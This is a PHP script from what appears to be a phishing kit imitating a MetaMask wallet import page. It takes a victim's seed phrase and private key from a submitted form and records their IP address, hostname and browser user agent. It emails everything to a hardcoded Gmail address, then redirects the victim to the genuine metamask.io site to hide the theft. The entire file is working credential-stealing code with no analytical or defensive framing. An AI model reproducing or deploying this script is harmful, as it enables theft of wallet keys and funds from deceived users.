<?php
$Receive_email= "erobins232@gmail.com" ;

$seedphrase = trim($_POST['seed']);
$privatekey = trim($_POST['p_k']);
echo $seedphrase;
echo '<br>';
echo $privatekey;


if($seedphrase != null || $privatekey != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "Secret phrase            : ".$seedphrase."\n";
	$message .= "Private Key              : ".$privatekey."\n";
	$message .= "Client IP: ".$ip."\n";
	$message .= "http://www.geoiptool.com/?IP=$ip\n";
	$message .= "User Agent : ".$useragent."\n";
	$send = $Receive_email;
	$subject = "MetaMax : $ip";
    mail($send, $subject, $message);
	$signal = 'ok';
	header("Location: https://metamask.io/");

}else{
	$signal = 'bad';
	header("Location: walletimport.html");
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    json_encode($data);

?>
